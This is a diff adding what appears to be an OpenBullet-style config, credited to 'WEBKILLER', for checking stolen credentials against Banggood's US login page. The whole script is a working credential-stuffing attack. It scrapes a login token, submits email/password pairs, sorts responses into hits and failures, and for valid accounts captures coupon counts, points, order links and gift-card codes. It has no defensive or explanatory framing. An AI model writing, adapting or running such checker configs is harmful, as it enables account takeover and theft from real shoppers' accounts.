@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "banggood",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-17T07:07:27.7169537+01:00",
+  "AdditionalInfo": "",
+  "Author": "WEBKILLER",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://us.banggood.com/login.html" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "token: \"" "\"," -> VAR "token" 
+
+REQUEST POST "https://us.banggood.com/index.php" 
+  CONTENT "com=account&t=submitLogin&email=<USER>&pwd=<PASS>&at=<token>&version=2" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Host: us.banggood.com" 
+  HEADER "Origin: https://us.banggood.com" 
+  HEADER "Referer: https://us.banggood.com/login.html" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false" 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true" 
+
+REQUEST GET "https://us.banggood.com/index.php?com=account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "class=\"middle_coupons_text_180801\">" "</strong>" -> CAP "COUPON NUMBER" 
+
+PARSE "<SOURCE>" LR "class=\"middle_points_text_180801\">" "</strong>" -> CAP "POINTS" 
+
+PARSE "<SOURCE>" LR "href=\"https://us.banggood.com/index.php?com=account&t=ordersList\" >" "</i></em>" -> CAP "ORDER" 
+
+REQUEST GET "https://us.banggood.com/index.php?com=account&t=giftcard" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<ul class=\"friends_list\">" "</div>  " -> CAP "GIFT CODE " 
+
